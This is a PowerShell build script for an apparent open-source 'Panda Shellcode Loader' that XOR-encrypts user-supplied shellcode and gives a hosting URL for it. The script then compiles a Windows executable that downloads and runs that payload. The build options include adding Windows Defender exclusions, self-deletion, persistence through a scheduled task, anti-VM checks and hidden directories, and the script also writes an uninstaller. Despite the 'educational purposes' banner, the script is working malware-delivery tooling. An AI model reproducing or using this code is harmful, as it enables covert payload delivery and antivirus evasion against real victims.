# https://github.com/Chainski/PandaLoader
﻿Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")] 
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int W, int H); '
$consoleHWND = [Console.Window]::GetConsoleWindow();
$consoleHWND = [Console.Window]::MoveWindow($consoleHWND, 0, 0, 900, 900);
$console = $host.UI.RawUI
$console.WindowTitle = "Panda Shellcode Loader"

Write-Host -ForegroundColor Blue " ╔═══╗╔═══╗╔═╗ ╔╗╔═══╗╔═══╗    ╔╗   ╔═══╗╔═══╗╔═══╗╔═══╗╔═══╗ "
Write-Host -ForegroundColor Blue " ║╔═╗║║╔═╗║║║╚╗║║╚╗╔╗║║╔═╗║    ║║   ║╔═╗║║╔═╗║╚╗╔╗║║╔══╝║╔═╗║ "
Write-Host -ForegroundColor Blue " ║╚═╝║║║ ║║║╔╗╚╝║ ║║║║║║ ║║    ║║   ║║ ║║║║ ║║ ║║║║║╚══╗║╚═╝║ "
Write-Host -ForegroundColor Blue " ║╔══╝║╚═╝║║║╚╗║║ ║║║║║╚═╝║    ║║ ╔╗║║ ║║║╚═╝║ ║║║║║╔══╝║╔╗╔╝ "
Write-Host -ForegroundColor Blue " ║║   ║╔═╗║║║ ║║║╔╝╚╝║║╔═╗║    ║╚═╝║║╚═╝║║╔═╗║╔╝╚╝║║╚══╗║║║╚╗ "
Write-Host -ForegroundColor Blue " ╚╝   ╚╝ ╚╝╚╝ ╚═╝╚═══╝╚╝ ╚╝    ╚═══╝╚═══╝╚╝ ╚╝╚═══╝╚═══╝╚╝╚═╝ "
Write-Host -ForegroundColor Blue "               CHAINSKI'S CUSTOM SHELLCODE LOADER             "
Write-Host -ForegroundColor Blue "     supports x64 NATIVE & .NET shellcode built with donut    "
Write-Host -ForegroundColor Blue "              https://github.com/chainski/PandaLoader         "
Write-Host -ForegroundColor Blue "                  FOR EDUCATIONAL PURPOSES ONLY               "
Write-Host "[*] Welcome $env:computername" -ForeGroundColor Cyan
Write-Host "[*] Configuring Build Dependencies" -ForeGroundColor Cyan
function ProcessingAnimation($scriptBlock) {
    $cursorTop = [Console]::CursorTop
    try {
        [Console]::CursorVisible = $false
        $counter = 0
        $frames = '|', '/', '-', '\ Loading Please Wait' 
        $jobName = Start-Job -ScriptBlock $scriptBlock
        while($jobName.JobStateInfo.State -eq "Running") {
            $frame = $frames[$counter % $frames.Length]
            Write-Host "$frame" -NoNewLine
            [Console]::SetCursorPosition(0, $cursorTop)
            $counter += 1
            Start-Sleep -Milliseconds 125
        }
    }
    finally {
        [Console]::SetCursorPosition(0, $cursorTop)
        [Console]::CursorVisible = $true
    }
}
ProcessingAnimation { Start-Sleep 1 } 

function Get-CommandVersion {
    param ([string]$command)
    try {
        $versionOutput = & $command --version 2>&1
        if ($LASTEXITCODE -eq 0) {
            return $versionOutput
        } else {
            return $null
        }
    } catch {
        return $null
    }
}
$gccCommand = "gcc"
$versionOutput = Get-CommandVersion $gccCommand
if ($versionOutput) {
    Write-Host "[*] GCC (or another C compiler) is found on the PATH." -ForeGroundColor Green
    Write-Host "[*] Version information:" -ForeGroundColor Green
    Write-Host $versionOutput
} else {
    Write-Host "[*] GCC (or another C compiler) is not found on the PATH. Please install GCC and add it to your PATH." -ForeGroundColor Red
}
function Get-ValidBinaryInput {
    param ([string]$prompt)
    while ($true) {
        $input = Read-Host $prompt
        if ($input -eq "1" -or $input -eq "0") {
            return $input
        } else {
            Write-Host "Invalid input. Please enter 1 or 0." -ForeGroundColor Red
        }
    }
}

function Get-RandomKey {
    $base64String = [Convert]::ToBase64String((1..10 | ForEach-Object {[byte](Get-Random -Max 256)}))
    $base64String = $base64String -replace '[+/=]', ''
    return $base64String
}
$startupEntryName = Get-RandomKey
$directoryName = Get-RandomKey
$fileName = Get-RandomKey
$xorKey = Get-RandomKey

Write-Host "[*] Generated XOR Key: $xorKey" -ForeGroundColor Cyan
$shellcodeFile = Read-Host "Enter the name of the shellcode file (in the same directory)"
$shellcodePath = Join-Path -Path $PSScriptRoot -ChildPath $shellcodeFile
if (-Not (Test-Path $shellcodePath)) {
    Write-Host "[*] File '$shellcodeFile' not found." -ForeGroundColor Red
	sleep 1
    exit
}
$shellcode = [System.IO.File]::ReadAllBytes($shellcodePath)
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($xorKey)
$keyLength = $keyBytes.Length
$xorBytes = New-Object byte[] $shellcode.Length
for ($i = 0; $i -lt $shellcode.Length; $i++) {
    $xorBytes[$i] = $shellcode[$i] -bxor $keyBytes[$i % $keyLength]
}
$xorFilePath = Join-Path -Path $PSScriptRoot -ChildPath "xor.bin"
[System.IO.File]::WriteAllBytes($xorFilePath, $xorBytes)
Write-Host "[*] Encrypted shellcode written to $xorFilePath" -ForeGroundColor Green
Write-Host "[*] Upload xor.bin to your server, copy the direct download link and paste it here eg: https://example.com/raw/shellcode.bin" -ForeGroundColor Green
function Get-ValidURL {
    param ([string]$prompt)
    while ($true) {
        $input = Read-Host $prompt
        if ($input -match '^http') {
            return $input
        } else {
            Write-Host "Invalid URL. Please enter a valid URL starting with http." -ForeGroundColor Red
        }
    }
}


$shellcodeURL = Get-ValidURL "[*] Enter the shellcode URL (starting with http):" 
$enableAdmin = Get-ValidBinaryInput "[*] Enter value for ENABLE_ADMIN (1 or 0):" 
$addExclusion = Get-ValidBinaryInput "[*] Enter value for ADD_EXCLUSION (1 or 0):" 
$melt = Get-ValidBinaryInput "[*] Enter value for MELT (1 or 0):" 
$enableStartup = Get-ValidBinaryInput "[*] Enter value for ENABLE_STARTUP (1 or 0):" 
$sleepDelay = Get-ValidBinaryInput "[*] Enter value for SLEEP_DELAY (1 or 0):" 
$enableAntiVM = Get-ValidBinaryInput "[*] Enter value for ENABLE_ANTIVM (1 or 0):"
$hideDirectory = Get-ValidBinaryInput "[*] Enter value for HIDE_DIRECTORY (1 or 0):"

if ($enableStartup -eq "1") {
Write-Host "[*] Generated Startup Entry Name: $startupEntryName" -ForeGroundColor Cyan
Write-Host "[*] Generated Directory Name: $directoryName" -ForeGroundColor Cyan
Write-Host "[*] Generated File Name: $fileName" -ForeGroundColor Cyan
}


$pandaLoaderPath = Join-Path -Path $PSScriptRoot -ChildPath "PandaLoader.cpp"
$backupPath = Join-Path -Path $PSScriptRoot -ChildPath "PandaLoader_backup.cpp"
Copy-Item -Path $pandaLoaderPath -Destination $backupPath -Force
$pandaLoaderContent = Get-Content $pandaLoaderPath


$pandaLoaderContent = $pandaLoaderContent -replace '#define ENABLE_ADMIN \d+', "#define ENABLE_ADMIN $enableAdmin"
$pandaLoaderContent = $pandaLoaderContent -replace '#define ADD_EXCLUSION \d+', "#define ADD_EXCLUSION $addExclusion"
$pandaLoaderContent = $pandaLoaderContent -replace '#define MELT \d+', "#define MELT $melt"
$pandaLoaderContent = $pandaLoaderContent -replace '#define ENABLE_STARTUP \d+', "#define ENABLE_STARTUP $enableStartup"
$pandaLoaderContent = $pandaLoaderContent -replace '#define SLEEP_DELAY \d+', "#define SLEEP_DELAY $sleepDelay"
$pandaLoaderContent = $pandaLoaderContent -replace '#define ENABLE_ANTIVM \d+', "#define ENABLE_ANTIVM $enableAntiVM"
$pandaLoaderContent = $pandaLoaderContent -replace '#define HIDE_DIRECTORY \d+', "#define HIDE_DIRECTORY $hideDirectory"

$pandaLoaderContent = $pandaLoaderContent -replace '#define STARTUP_ENTRYNAME OBF\("PERSISTENCE_REPLACE_ME"\)', "#define STARTUP_ENTRYNAME OBF(`"$startupEntryName`")"
$pandaLoaderContent = $pandaLoaderContent -replace '#define DIRECTORY_NAME OBF\("DIRECTORY_REPLACE_ME"\)', "#define DIRECTORY_NAME OBF(`"$directoryName`")"
$pandaLoaderContent = $pandaLoaderContent -replace '#define FILENAME OBF\("FILENAME_REPLACE_ME"\)', "#define FILENAME OBF(`"$fileName`")"
$pandaLoaderContent = $pandaLoaderContent -replace '#define XOR_DECRYPTION_KEY OBF\("XOR_KEY_REPLACE_ME"\)', "#define XOR_DECRYPTION_KEY OBF(`"$xorKey`")"
$pandaLoaderContent = $pandaLoaderContent -replace '#define SHELLCODE_URL OBF\(L"SHELLCODE_URL_REPLACE_ME"\)', "#define SHELLCODE_URL OBF(L`"$shellcodeURL`")"


$pandaLoaderContent | Set-Content -Path $pandaLoaderPath -Force
Write-Host "[*] Updated PandaLoader.cpp with customized values." -ForeGroundColor Green
$buildCommand = 'g++ -std=c++17 -masm=intel -w PandaLoader.cpp -Os -static -mwindows -s -Wl,--gc-sections -lwininet -o PandaLoader.exe'
Write-Host "[*] Building PandaLoader.exe..." -ForeGroundColor Green
cmd.exe /c $buildCommand

if ($enableStartup -eq "1") {
$uninstallerPath = Join-Path -Path $PSScriptRoot -ChildPath "uninstaller.ps1"
$uninstallerContent = @"
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))  
{  
  `$arguments = "& '" +`$myinvocation.mycommand.definition + "'"
   Start-Process powershell -Verb runAs -ArgumentList `$arguments
   Break
}
function CLEANUP {
	`$ErrorActionPreference = "SilentlyContinue"
	 Remove-MpPreference -ExclusionPath @(`$env:userprofile, `$env:programdata) -Force
	 Write-Host "[!] Windows Defender Exclusions Removed" -ForegroundColor Green 
    `$directoryPath = "C:\ProgramData\$directoryName" 
    if (Test-Path `$directoryPath) {
        Write-Host "[!] Directory exists: `$directoryPath"
        Remove-Item -Recurse -Force `$directoryPath
        Write-Host "[!] Directory removed: `$directoryPath" -ForegroundColor Green 
    } else {
        Write-Host "[!] Directory not found: `$directoryPath" -ForegroundColor Red 
    }
    `$taskName = "$startupEntryName" 
    if (Get-ScheduledTask -TaskName `$taskName -ErrorAction SilentlyContinue) {
        Write-Host "[!] Scheduled task exists: `$taskName"
        Unregister-ScheduledTask -TaskName `$taskName -Confirm:`$false
        Write-Host "[!] Scheduled task removed: `$taskName" -ForegroundColor Green 
    } else {
        Write-Host "[!] Scheduled task not found: `$taskName" -ForegroundColor Red 
        Write-Host "[!] CLEANUP COMPLETE" -ForegroundColor Green 
    }
}
CLEANUP
pause
"@
$uninstallerContent | Set-Content -Path $uninstallerPath -Force
Write-Host "[*] uninstaller.ps1 has been built !" -ForeGroundColor Green
}

if (Test-Path -Path "$PSScriptRoot\PandaLoader.exe") {
    Write-Host "[*] Build completed successfully. If you like the project consider leaving a star !" -ForeGroundColor Green
} else {
    Write-Host "[*] Build failed." -ForeGroundColor Red
}
Copy-Item -Path $backupPath -Destination $pandaLoaderPath -Force
Remove-Item -Path $backupPath -Force
# Write-Host "[*] PandaLoader.cpp has been restored to its original state." -ForeGroundColor Green
